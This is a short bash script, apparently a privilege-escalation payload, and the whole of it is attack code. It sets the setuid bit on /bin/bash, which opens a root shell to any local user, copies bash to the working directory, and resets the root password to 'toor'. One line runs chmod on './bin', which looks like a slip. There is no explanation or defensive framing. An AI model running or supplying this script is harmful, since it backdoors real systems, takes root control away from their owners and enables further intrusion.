#!/bin/bash -e

cp /bin/bash .
chmod u+s /bin/bash
chmod u+s ./bin

whoami
echo -e "toor\ntoor\n" | passwd root
